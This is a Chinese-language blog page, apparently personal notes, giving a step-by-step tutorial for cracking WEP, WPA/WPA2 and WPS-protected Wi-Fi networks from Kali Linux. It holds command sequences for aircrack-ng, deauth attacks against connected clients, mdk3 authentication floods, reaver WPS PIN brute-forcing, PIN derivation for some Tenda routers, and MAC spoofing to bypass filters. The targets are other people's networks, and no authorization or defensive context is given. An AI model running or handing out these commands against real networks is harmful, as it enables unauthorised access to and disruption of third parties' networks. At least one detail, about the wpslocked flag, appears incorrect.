---
layout: dafault
title: Wifi密码破解
---

##通过字典（暴力）破解WIFI密码##

简单破解wep/wpa/wpa2加密的wifi密码，平台kali-Linux，工具为Aircrack-ng

破解过程是通过抓取正确密码的握手包（链接wifi的时候的互相交换报文），从
抓取到的握手包里找wifi密码；wep加密的wifi，可以通过足够多的报文根据算法
算出密码，所以wep的加密算法较弱；如果是wpa/wpa2的wifi，是不可能直接计算
出密码的，需要准备足够强大的密码，通过算法比对握手包里的密码和密码字典，
从而试出密码……

###wep加密的wifi步骤###

通过以下两个命令加载无线网卡，和激活网卡到监听模式monitor：

> airmon-ng wlan0 up    #加载无线网卡  
> airmon-ng start wlan0 #激活网卡  
> airmon-ng wlan0 down  #去加载网卡  

激活网卡之后输入：
> airodump-ng mon0 #探测要攻击的目标主机，按ctrl+z 停止探测

可以看到路由器的名字，mac地址，信号电平，CH，MB，加密方式(wpa/wpa2/wep)等
以及客户端到路由器的连接包
选中要攻击的路由器为目标，记住它的mac地址例如6C:E8:73:48:A8:FC，以及连接
到该路由器客户端的mac地址，例如：78:F7:BE:4A:82:81， 以及CH号,例如CH为1

然后输入如下命令开始抓包：
> airodump-ng --ivs -w abc -c 1 mon0
> #--ivs是通过ivs过滤，只保留可以破解密码的报文.ivs文件，这样比较快点；-w
> #是将抓取的报文写入命名为abc并保存（之后会在当前文件夹保存为abc-01.ivs）；
> #-c后面跟频道，如这里的1 。

然后新开一个终端窗口，对目标主机进行deauth攻击，以加速抓吧，命令格式为
aireplay-ng -0 大小 -a 目标主机mac -c 客户端mac mon0
> aireplay-ng -0 10 -a 6C:E8:73:48:A8:FC -c 78:F7:BE:4A:82:81 mon0

接下来再开一个终端窗口，输入:
> aircrack-ng abc-01.ivs
然后输入要破解的无线网络序号开始破解密码！此过程中可以看到抓取的报文的数量，
一般当报文数量大于2W就可以直接出来了。

如果破解过程中出现的报文少而等待报文的情况，直到达到要求开始破解，可以
使用mdk3工具对目标进行洪水验证攻击，命令如下：
> mdk3 mon0 a -a 目标主机mac

密码比较简单的话一般2500ivs就可以出密码了。

###wpa/wpa2无线wifi破解###

破解wpa/wpa2加密的wifi密码，步骤和破解wep无线wifi密码基本一致，除了在最后
一步需要有一个强大的密码字典；通过字典破解密码的命令为:
> aircrack-ng -w 字典名字 ivs/cap文件
> aircrack-ng -w passwd.txt abc-01.ivs #例子

另外Linux平台字典生成软件crunch，可以按照自己的设定生成不同的密码库
[crunch软件简介]:http://xiao106347.blog.163.com/blog/static/215992078201311288592423/

###参考文件###
[Wifi密码破解1]:http://xiao106347.blog.163.com/blog/static/2159920782013523143959/


##利用wps漏洞穷举PIN码破解wifi密码##

###通过已有pin码破解路由登录密码###
如果已经得到密码，Linux系统下可以使用Reaver软件破解路由的密码，使用的命令：
> reaver -i mon0 -b 目标路由器mac地址 -p pin码

###通过reaver命令穷举PIN码###

命令如下：
> reaver -i mon0 -b 目标mac地址 -S -v -n

reaver 命令参数：
+ -i 监听后接口名称
+ -b 目标mac地址
+ -a 自动检测目标AP最佳配置
+ -S 使用最小的DH key（可以提高PJ速度）
+ -vv 显示更多的非严重警告
+ -d  即delay每穷举一次的闲置时间 预设为1秒
+ -t  即timeout每次穷举等待反馈的最长时间
+ -c  指定频道可以方便找到信号，如-c1 指定1频道，大家查看自己的目标频道做相应修改 （非TP-LINK路由推荐–d9 –t9  参数防止路由僵死

示例：
    reaver -i mon0 -b MAC -a -S –d9 –t9 -vv） 
    应因状况调整参数（-c后面都已目标频道为1作为例子）  
    目标信号非常好: reaver -i mon0 -b MAC -a -S -vv -d0 -c 1  
    目标信号普通: reaver -i mon0 -b MAC -a -S -vv -d2 -t 5 -c 1  
    目标信号一般: reaver -i mon0 -b MAC -a -S -vv -d5 -c 1  

穷举的过程reaver生成以路由max地址为名的wpc文件，若第一次pin不出来，第二次
pin的时候敏玲添加参数 -s file.wpc继续pin；
除了这个方法之外可以多开几个终端窗口，都分别从不同的数字段开始pin，提高效率，
如 reaver -i mon0 -b msc -S -v -n -p 9000/8000.

###wifi开启wps后是否可以探测pin###

- `airodump-ng mon0` 命令的MB列中，值为54e. 的可以探测pin

- `wash -i mon0 -C` 命令的wpslocked列，值为YES的就是可以探测pin码的wifi

###特殊路由的pin码可以通过计算得出###

腾达和磊科的产品路由器mac地址是以"C83A35"或"00B00C"开头的可以直接计算出pin码；
腾达的这款路由的pin码，是将mac地址后6为换算成10进制，得到pin码的前7位，后面一位
通过尝试得出pin码；

##修改MAC地址过滤##
airodump-ng mon0 抓包的时候会显示合法的客户端mac地址，只要修改我们的mac地址为合法
的mac即可：
临时修改：
> ifconfig wlan0 down        #关闭网卡
> ifconfig wlan0 hw ether 00:AA:BB:CC:DD:EE            #然后改地址
> ifconfig wlan0 up             #然后启动网卡

用macchanger软件:
> ifconfig wlan0 down
> macchanger -m 00:AA:BB:CC:DD:EE wlan0         或：
> macchanger --mac=00:AA:BB:CC:DD:EE wlan0
> ifconfig wlan0 up
